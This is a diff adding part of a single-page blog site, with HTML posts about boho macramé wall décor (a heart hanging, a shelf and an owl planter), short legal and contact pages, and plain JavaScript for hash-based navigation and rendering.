+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>Three staggered hearts create soft, downward movement.</li>
+                        <li>Neutral cotton suits nearly any room and palette.</li>
+                        <li>Perfect for bedrooms, nurseries, and cozy nooks.</li>
+                        <li>Makes a heartfelt, long-lasting handmade gift.</li>
+                        <li>Beginner-friendly to knot with just a few core knots.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Small Piece, Big Warmth</h2>
+                    <p>A boho macramé heart hanging proves that you do not need bold color or grand scale to change how a room feels. Its gentle texture, calming neutral tone, and quietly romantic shape bring warmth to any wall they touch. Whether you hang it above your bed, tuck it into a reading corner, or gift it to someone you love, it carries a little handmade tenderness that store-bought art rarely matches. That is the beauty of macramé, so much feeling knotted into something so simple.</p>
+
+                    <div style="margin-top:28px;">
+                      <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Macramé Heart</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Boho Wall Décor</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Gift</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Neutral Home</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fiber Art</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Bedroom</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nursery Décor</span>
+                    </div>
+                `
+            },
+            {
+                id: 'the-third-post',
+                title: 'Macramé Wall Hanging Shelf with Vintage Wood',
+                date: 'January 22, 2026',
+                image: './assets/Macrame Wall Hanging Shelf Vintage Wood.png',
+                excerpt: `Meet the wall décor that actually works for a living: a two-tier macramé shelf strung with natural cotton and warm vintage wood. 🌿 It is equal parts boho art and real storage, holding plants, candles, crystals, and little treasures while adding gorgeous handwoven texture. Function and beauty in one hardworking piece.
+
+• Two solid shelves hold plants, books, and trinkets 🪴
+• Wooden beads and knotted cord bring cozy artisan detail
+
+Perfect for small spaces, plant lovers, and boho corners that need storage. Save for later and pin it to your DIY home board!`,
+                content: `
+                    <p>Wall art is lovely, but wall art that also holds your favorite plant, a stack of candles, and a few small treasures is even better. This two-tier macramé shelf is exactly that kind of hardworking beauty. It marries the soft, handwoven texture of natural cotton cord with the warmth of vintage-style wood boards, giving you real, usable storage that looks like a piece of fiber art. For anyone tight on floor space or simply in love with the boho look, this is a genuinely smart addition.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>A macramé shelf combines boho texture with real storage.</li>
+                        <li>Two wooden tiers hold plants, books, candles, and keepsakes.</li>
+                        <li>It saves precious floor space in small rooms.</li>
+                        <li>Wooden beads and knotwork add handcrafted character.</li>
+                        <li>It suits bedrooms, bathrooms, kitchens, and reading nooks.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why a Macramé Shelf Is the Ultimate Boho Multitasker</h2>
+                    <p>Most décor asks for space and gives back nothing but looks. A macramé shelf flips that deal. It takes up vertical wall real estate that would otherwise sit empty, and it hands you two functional surfaces in return. For renters, small-apartment dwellers, and anyone chasing a clutter-free look, that combination of beauty and utility is hard to beat.</p>
+                    <p>The design leads with texture. A richly knotted panel of cotton cord flows down the center, worked in classic diamond and spiral patterns that catch light and cast soft shadows. That handmade surface is what turns a simple storage solution into a statement piece.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When floor space is limited, go vertical. Wall-mounted shelving frees up the ground plane, which instantly makes a small room feel larger and calmer.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Closer Look at the Construction</h2>
+                    <p>This piece is a lovely study in how cord and wood can work together. Each element pulls its weight, both structurally and visually.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Top Dowel and Header</h3>
+                    <p>A sturdy wooden dowel spans the top, wrapped with tidy rows of cord. This is the backbone that everything hangs from, and it keeps the whole piece balanced and secure.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Central Knotted Panel</h3>
+                    <p>The heart of the design is the decorative macramé panel, worked in a symmetrical V of diamond lattice and braided detail. This is the artistic showpiece that elevates the shelf above ordinary storage.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Wooden Shelves and Beads</h3>
+                    <p>Two solid wood boards form the tiers, suspended by twisted spiral cords and punctuated with chunky wooden beads. Those beads are more than decoration, they help lock the shelves at the right height while adding rustic charm.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">The Fringe Finish</h4>
+                    <p>At the very bottom, a sweep of combed-out fringe forms a soft point, giving the piece a polished, intentional ending rather than leaving loose cords dangling.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What to Display on Your Shelves</h2>
+                    <p>Half the fun of a shelf like this is styling it. Keep things light in weight and curated in feel, so the display complements the knotwork rather than overwhelming it.</p>
+                    <ul>
+                        <li><strong>Trailing plants:</strong> A small pothos or string of pearls that spills over the edge looks magical against the cord.</li>
+                        <li><strong>Candles and holders:</strong> Warm light near macramé is always a winner.</li>
+                        <li><strong>Crystals and small stones:</strong> Perfect for a calm, mindful corner.</li>
+                        <li><strong>Tiny books or a framed photo:</strong> Personal touches that make it yours.</li>
+                        <li><strong>Ceramic trinket dishes:</strong> Great for jewelry by the bed or the bath.</li>
+                    </ul>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+                      <p style="margin:0;">A shelf you actually use every day earns its wall space many times over. Combining storage with beautiful craft means you get function and personality from a single piece, which is the essence of smart, intentional decorating.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Hanging It Safely and Securely</h2>
+                    <p>Because this shelf holds real weight, mounting it properly matters. A little care here protects both your wall and your treasures.</p>
+                    <ol>
+                        <li>Choose a spot on a wall stud where possible, or use a wall anchor rated for the load.</li>
+                        <li>Keep the display items light, ceramics and small plants rather than heavy books stacked high.</li>
+                        <li>Check the knots and hanging cord every few months for any signs of wear.</li>
+                        <li>Avoid overloading a single tier, and spread weight evenly across both shelves.</li>
+                    </ol>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Water your shelf plants over a sink, then return them once they finish dripping. Keeping moisture off the cotton cord prevents staining and keeps the natural fibers looking bright.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Where It Works Best in Your Home</h2>
+                    <p>This shelf earns its keep in almost every room. In a bedroom, it becomes a floating nightstand for a small lamp and a book. In a bathroom, it holds rolled towels, candles, and a trailing plant for a spa-like feel. In a kitchen, it can display herbs and pretty jars, and in a home office it keeps stationery and a small succulent within reach. The neutral cotton and warm wood mean it blends into boho, farmhouse, Scandinavian, and eclectic interiors with equal ease.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>Two-tier design offers real, usable storage.</li>
+                        <li>Diamond knotwork and wooden beads add artisan detail.</li>
+                        <li>Ideal for small spaces and vertical decorating.</li>
+                        <li>Style it with plants, candles, and small keepsakes.</li>
+                        <li>Mount into a stud or rated anchor for safety.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Beautiful and Genuinely Useful</h2>
+                    <p>The best décor does double duty, and a macramé wall shelf is a shining example. It delivers all the soft, handmade texture that makes boho interiors feel so welcoming, while quietly solving the everyday problem of where to put your plants and little treasures. With its vintage-toned wood, richly knotted cord, and playful beaded details, it is the kind of piece that draws compliments and pulls its weight at the same time. If you want your walls to work as hard as they look good, this shelf is the answer.</p>
+
+                    <div style="margin-top:28px;">
+                      <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Macramé Shelf</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wall Storage</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Boho Décor</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plant Shelf</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Small Space Living</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rustic Wood</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Home</span>
+                    </div>
+                `
+            },
+            {
+                id: 'the-fourth-post',
+                title: 'Boho Macramé Owl Wall Hanging with Plant Pocket',
+                date: 'April 9, 2026',
+                image: './assets/macrome .png',
+                excerpt: `Say hello to the friendliest wall décor around: a boho macramé owl with a built-in pocket for a real little plant. 🦉 Woven in warm terracotta, sage, and mustard tones with big beady eyes and a tiny brass moon, it is playful, cozy, and full of personality. Part fiber art, part tiny planter, all charm.
+
+• Holds a small potted plant right in the owl's belly 🌱
+• Earthy multicolor palette warms up any neutral wall
+
+Perfect for boho nurseries, plant lovers, and whimsical corners. Save for later and pin it to your handmade décor board!`,
+                content: `
+                    <p>Some pieces of décor make you smile the moment you see them, and this boho macramé owl is one of them. With its wide beady eyes, softly layered feathers in earthy terracotta, sage, and mustard, and a clever little pocket that cradles a real plant, it is equal parts fiber art and functional planter. It brings warmth, whimsy, and a touch of nature to any wall, and it does it with so much character that it instantly becomes a room's favorite detail.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>A macramé owl doubles as playful wall art and a mini planter.</li>
+                        <li>Warm earthy tones add color without overwhelming a space.</li>
+                        <li>The built-in pocket holds a small potted plant beautifully.</li>
+                        <li>Beads, feathers, and a brass moon add rich detail.</li>
+                        <li>It is a charming choice for nurseries and boho corners.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Owl That Doubles as a Planter</h2>
+                    <p>Owls have long been symbols of wisdom, calm, and quiet watchfulness, which makes them a natural fit for a cozy home. This design takes that beloved motif and gives it a practical twist. Tucked into the owl's belly is a woven pocket sized for a small terracotta pot, so your feathered friend can hold a living succulent or trailing plant. It is a delightful surprise that transforms a decorative hanging into something you interact with and care for.</p>
+                    <p>The color story is what sets this piece apart from the usual all-cream macramé. Feathers layered in rust, gold, and soft green give the owl depth and a gentle autumnal warmth, while the natural cotton base keeps it grounded. It is colorful without being loud, which is a tricky balance to strike.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Earthy, muted colors are the easiest way to add warmth to a neutral room without clashing. Terracotta, sage, and mustard all sit comfortably beside natural wood and cream cotton.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">All the Charming Details</h2>
+                    <p>This owl is packed with thoughtful touches, and part of the joy is discovering them one by one.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Expressive Eyes</h3>
+                    <p>Two large round beads form the owl's eyes, framed by rings of knotted cord and swooping terracotta brows. This is where all the personality lives, giving the piece a friendly, alert expression.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Layered Feather Wings</h3>
+                    <p>The wings are built from overlapping bands of colored cord, mimicking real feathers. This layering technique adds gorgeous dimension and is a lovely showcase of skilled knotwork.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Plant Pocket and Brass Moon</h3>
+                    <p>A woven net-style pocket sits at the belly to hold a small pot, accented with a tiny brass crescent moon charm. It is a magical, celestial touch that ties into boho and cottagecore aesthetics alike.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">The Beaded Tail Fringe</h4>
+                    <p>The owl's tail flows into long fringe threaded with wooden beads in graduated sizes. This beaded detail adds rhythm and a satisfying finish, drawing the eye all the way to the bottom.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Best Plants for Your Owl Pocket</h2>
+                    <p>Choosing the right plant keeps your owl happy and low maintenance. Lean toward small, hardy, and slow-growing varieties that do not need constant repotting.</p>
+                    <ul>
+                        <li><strong>Faux succulents:</strong> Zero care and always fresh, ideal if the spot gets little light.</li>
+                        <li><strong>Live succulents:</strong> Compact and forgiving, perfect for a bright wall.</li>
+                        <li><strong>Small pothos:</strong> A trailing vine that softens the owl's shape over time.</li>
+                        <li><strong>Air plants:</strong> No soil needed, just an occasional misting or soak.</li>
+                    </ul>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Note</h3>
+                      <p style="margin:0;">If you choose a live plant, remove the pot to water it and let it drain fully before returning it to the pocket. This keeps moisture off the cotton cord and prevents staining or mildew.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling the Owl in Your Space</h2>
+                    <p>This piece has enough personality to stand alone, so give it a little breathing room. A clear stretch of neutral wall lets the colors and details pop. Flank it with a few trailing houseplants or a leafy branch in a vase, and the owl feels right at home in its natural setting. It is especially wonderful in a child's room, where the friendly face and playful shape spark imagination, but it is just as charming in a plant-filled living room or a cozy reading corner.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Hang the owl slightly above eye level so its big eyes gaze gently downward into the room. That small placement trick makes the whole piece feel more alive and welcoming.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Meaningful, Whimsical Gift</h2>
+                    <p>Because it blends nature, whimsy, and handmade craft, this owl makes a memorable gift. It suits plant lovers, new parents decorating a nursery, and anyone drawn to boho or nature-inspired interiors. Pair it with a tiny potted succulent and you have a complete, ready-to-hang present that feels personal and thoughtful. Gifts that combine beauty with a little function always land well, and a planter you can admire on the wall checks both boxes.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>Playful owl design with a working plant pocket.</li>
+                        <li>Warm terracotta, sage, and mustard color palette.</li>
+                        <li>Beady eyes, layered feathers, and a brass moon charm.</li>
+                        <li>Pairs best with small succulents or trailing plants.</li>
+                        <li>A charming gift for plant lovers and nurseries.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Wise Little Addition to Any Wall</h2>
+                    <p>This boho macramé owl proves that home décor can be joyful. It combines the soft artistry of fiber work, the warmth of earthy color, and the living freshness of a real plant into one irresistibly charming piece. Whether it watches over a nursery, brightens a plant-filled corner, or lands as a thoughtful gift, it brings personality and a gentle sense of nature indoors. In a world of plain walls, a friendly knotted owl with a plant in its belly is exactly the kind of detail that makes a house feel like home.</p>
+
+                    <div style="margin-top:28px;">
+                      <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Macramé Owl</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Boho Décor</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plant Holder</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nursery Wall Art</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fiber Art</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cottagecore</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Planter</span>
+                    </div>
+                `
+            },
+        ];
+
+        // Static Legal Pages
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Organized Ambition</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Organized Ambition, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@example.com" style="color: #a855f7;">contact@example.com</a></p>
+                `
+            }
+        };
+
+        const app = document.getElementById('app');
+        const blogUsername = "Organized Ambition";
+        const avatarUrl = "https://via.placeholder.com/100/a855f7/ffffff?text=OA";
+
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/800x480/1a1a24/a855f7?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span>↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: white;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: white;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/800x480/1a1a24/a855f7?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span>↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
